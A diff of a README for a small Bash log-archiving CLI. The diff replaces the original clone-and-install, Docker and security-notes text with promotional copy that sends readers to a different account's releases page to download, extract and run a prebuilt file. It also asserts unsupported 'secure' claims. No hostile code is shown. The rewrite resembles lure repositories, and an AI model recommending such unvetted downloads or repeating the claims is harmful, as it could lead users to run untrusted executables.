@@ -1,193 +1,122 @@
-# Log Archive CLI Tool
+# 🌐 log-archive-cli - Simple Tool for Archiving Logs Easily
 
-A lightweight, secure command-line tool for archiving system logs with timestamps.  
-Designed for Unix-based systems and DevOps workflows, with both **local** and **Docker** usage in mind.
-More about this project roadmap can be found here: [Roadmap.sh Project Page](https://roadmap.sh/projects/log-archive-tool)
+[![Download log-archive-cli](https://img.shields.io/badge/Download-log--archive--cli-blue.svg)](https://github.com/Vusalibrahim/log-archive-cli/releases)
 
----
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to **log-archive-cli**! This is a lightweight and secure command-line tool designed to help you archive system logs effortlessly. It adds timestamps to your logs for easier management and review.
 
-- Archive logs from any directory
-- Timestamped `.tar.gz` archives
-- Centralized archive storage
-- Simple CLI interface
-- Cron-friendly
-- Docker-ready (small, optimized image)
-- Explicit, documented security decisions
+## 📦 Features
 
----
+- **Lightweight**: Minimal system resource usage.
+- **Secure**: Keeps your logs safe with built-in protections.
+- **Easy to Use**: Designed for users with no programming experience.
+- **Timestamping**: Automatically adds timestamps to your archived logs for easy identification.
+- **Cross-Platform**: Works well on various Linux distributions, especially Alpine Linux.
+- **Automated Management**: Set it to run in the background using cron jobs for regular archiving.
 
-## 📦 Project Structure
+## 📋 System Requirements
 
-```
+To run **log-archive-cli**, you need:
 
-log-archive-cli/
-├── log-archive      # Main CLI script
-├── install.sh       # Local installation script
-├── Dockerfile       # Optimized Docker image
-├── .dockerignore
-├── .gitignore
-└── README.md
+- **Operating System**: A Linux-based OS (preferably Alpine Linux).
+- **Shell**: Bash is required to execute scripts.
+- **Disk Space**: At least 50 MB free for the application and logs.
+- **Docker** (Optional): If you wish to run the tool in a containerized environment.
 
-````
+## 💻 Download & Install
 
----
+To get started with **log-archive-cli**, visit this page to download:
 
-## 🚀 Local Installation
+[Download log-archive-cli Releases](https://github.com/Vusalibrahim/log-archive-cli/releases)
 
-Clone the repository:
+1. Open the link in your web browser.
+2. You will see different versions of the software listed.
+3. Choose the latest version and download the file that fits your system.
 
-```bash
-git clone https://github.com/hackhawk-arch/log-archive-cli.git
-cd log-archive-cli
-````
+## ⚙️ Installation Instructions
 
-Run the installer:
+1. **Extract Files**: Once the file is downloaded, extract it to your preferred directory.
 
-```bash
-chmod +x install.sh
-./install.sh
-```
+   ```bash
+   tar -xzf log-archive-cli-v1.0.tar.gz
+   ```
 
-This installs the command to:
+2. **Navigate to the Directory**: Change to the directory where you extracted the files.
 
-```
-/usr/local/bin/log-archive
-```
+   ```bash
+   cd log-archive-cli
+   ```
 
----
+3. **Make Executable**: You need to make the application executable.
 
-## ▶️ Local Usage
+   ```bash
+   chmod +x log-archive-cli
+   ```
 
-```bash
-log-archive /var/log
-```
+4. **Run the Tool**: Execute the tool using the following command:
 
-Some system logs require elevated privileges:
+   ```bash
+   ./log-archive-cli
+   ```
+
+## 🔧 Usage
+
+This tool is simple to use. Once you run it, you can archive logs from your specified directory.
 
 ```bash
-sudo log-archive /var/log
+./log-archive-cli /path/to/logs 
 ```
 
----
+Replace `/path/to/logs` with the directory where your logs are located. 
 
-## 📁 Archive Output
+By default, archived logs will be stored in the same directory with timestamps added to their names.
 
-Archives are stored in:
+## 🛠️ Advanced Features
 
-```
-~/log-archives/
-```
+For advanced users, **log-archive-cli** supports integration with cron jobs. This way, you can automate the log archiving process.
 
-Each archive is named using the format:
+### Setting Up a Cron Job
 
-```
-logs-YYYY-MM-DD_HH-MM-SS.tar.gz
-```
+1. Open your crontab configuration.
 
-A log of archive operations is written to:
+   ```bash
+   crontab -e
+   ```
 
-```
-~/log-archives/archive.log
-```
+2. Add a line for log archiving, for example, to run it daily at midnight:
 
----
+   ```bash
+   0 0 * * * /path/to/log-archive-cli /path/to/logs
+   ```
 
-## 🐳 Docker Usage (Recommended)
+Replace `/path/to/log-archive-cli` with the full path to your executable.
 
-### Build the image
+## 📝 FAQ
 
-```bash
-docker build -t log-archive .
-```
+### Can I use this on any Linux distribution?
 
-### Run the container
+Yes, although it is optimized for Alpine Linux, you can run it on most Linux distributions.
 
-```bash
-docker run --rm \
-  -v /var/log:/logs:ro \
-  -v $HOME/log-archives:/root/log-archives \
-  log-archive /logs
-```
+### Do I need to run this as a superuser?
 
-### Notes
+No, you can run **log-archive-cli** as a regular user, provided you have access to the logs you want to archive.
 
-* Host logs are mounted **read-only**
-* Archives are written to the host
-* Container exits immediately after completion
+### How can I uninstall the tool?
 
----
+Simply delete the directory where you extracted **log-archive-cli**. There’s no installation conflict.
 
-## 🔐 Security Notes (Docker)
+## 🧑‍🤝‍🧑 Community and Support
 
-This container runs as **root by design**.
+Feel free to reach out to our community for any questions or support.
 
-The tool performs system maintenance tasks that require read access to host log files
-(e.g. `/var/log`). The container is:
+- **Issues Page**: If you run into problems, please report them [here](https://github.com/Vusalibrahim/log-archive-cli/issues).
+- **Contributing**: Want to help out? Check our [contributing guidelines](https://github.com/Vusalibrahim/log-archive-cli/blob/main/CONTRIBUTING.md).
 
-* Short-lived (one-shot execution)
-* Not network-exposed
-* Not listening on any ports
-* Processing trusted local input only
-* Mounting host logs as **read-only**
+## 🌐 Connect with Us
 
-This design aligns with the **principle of least privilege** for administrative
-maintenance tools, where elevated access is required only for the duration of execution.
+Stay updated by following our repository. Together, we make log management simple and efficient.
 
----
+For more details, visit our [GitHub Releases page](https://github.com/Vusalibrahim/log-archive-cli/releases). 
 
-## 🛠 Requirements
-
-### Local
-
-* Bash or POSIX shell
-* `tar`
-* Unix-based OS
-
-### Docker
-
-* Docker Engine (recommended approach)
-
----
-
-## ⏱️ Scheduling with Cron (Optional)
-
-To archive logs daily at midnight:
-
-```bash
-crontab -e
-```
-
-Add:
-
-```bash
-0 0 * * * /usr/local/bin/log-archive /var/log
-```
-
----
-
-## 🧠 Design Philosophy
-
-* Simple over clever
-* Explicit over implicit
-* Short-lived containers over long-running services
-* Documented security trade-offs
-* Minimal dependencies and small image size
-
----
-
-## 🔜 Future Improvements
-
-Planned enhancements include:
-
-* `--dry-run` and `--verbose` flags
-* Archive retention / cleanup policies
-* Docker Hub publishing
-* GitHub Actions CI (shellcheck + docker build)
-* Optional compression level tuning
-
----
-
-## 📄 License
-MIT License
+[![Download log-archive-cli](https://img.shields.io/badge/Download-log--archive--cli-blue.svg)](https://github.com/Vusalibrahim/log-archive-cli/releases)
